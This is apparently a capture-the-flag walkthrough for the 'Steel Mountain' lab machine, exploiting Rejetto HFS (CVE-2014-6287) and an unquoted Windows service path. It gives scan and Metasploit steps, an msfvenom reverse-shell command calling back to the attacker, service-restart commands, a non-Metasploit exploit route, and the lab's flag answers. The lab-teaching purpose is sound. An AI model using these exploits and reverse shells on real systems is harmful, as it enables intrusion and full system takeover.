# Steel Mountain

### Introduction

**Who is employee of the month?**

Bill Harper

### Initial Access

**Scan the machine with nmap. What is the other port running a web server on?**

`nmap -sC -v -oN steel-mountain-nmap <TARGET-IP>`

[Scan results](./steel-mountain-nmap)

8080

**Take a look at the other web server. What file server is running?**

Navigate to `http://<TARGET-IP>:8080` and find a landing page for a Rejetto HTTP file server.

Rejetto HTTP File Server

**What is the CVE number to exploit this file server?**

Use `searchsploit "rejetto http file server"` to find related exploits.

First result is a Metasploit module.

2014-6287

**Use Metasploit to get an initial shell. What is the user flag?**

Set the RPORT, RHOST and LHOST options to TARGET-IP, PORT and tun0 or AttackBox IP then run 
the exploit.

Using the meterpreter shell run the search command `search -f user.txt` to find the flag.

��b04763b6fcf51fcd7c13abc7db4fd365

### Privilege Escalation

Download and upload the PowerUp script to enumerate the machine. [PowerUp link](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)

To execute this type load powershell into meterpreter then enter a powershell shell by 
entering powershell_shell:

**Take close attention to the CanRestart option that is set to true. What is the name of the 
service which shows up as an unquoted service path vulnerability?**

AdvancedSystemCareService9

The CanRestart option being true lets you restart a service on the system, the directory to 
the application is also writable. You can replace the legitimate application with a 
malicious one, restart the service, which will run the infected program.

Use msfvenom to generate a reverse shell as an Windows executable.

`msfvenom -p windows/shell_reverse_tcp LHOST=CONNECTION_IP LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe`

Upload your binary to the C:\Program Files (x86)\IObit directory where the unquoted path 
vulnerability will cause the service to execute the malicious Advanced.exe reverse shell 
instead of moving into C:\Program Files (x86)\IObit\Advanced SystemCare on a restart. 

Restart the service to get a shell as root.

```
net stop AdvancedSystemCareService9
net start AdvancedSystemCareService9
``` 

**What is the root flag?**

9af5f314f57607c00fd09803a587db80

### Access and Escalation Without Metasploit

Gain access using the same CVE but a different exploit, [number 39161](https://www.exploit-db.com/exploits/39161)

Start a web server in a directory with a netcat static binary and winPEAS.exe inside.

`python3 -m http.server <PORT>`

Edit the exploit.py to use your attacking machine's IP and the port you will use for the 
netcat listener.

Start a netcat listener on the port set in the exploit.py file

Run the exploit `python2 ./exploit.py <TARGET-IP> <TARGET-PORT>` twice, once for the nc.exe 
binary and the second time to gain a remote shell.

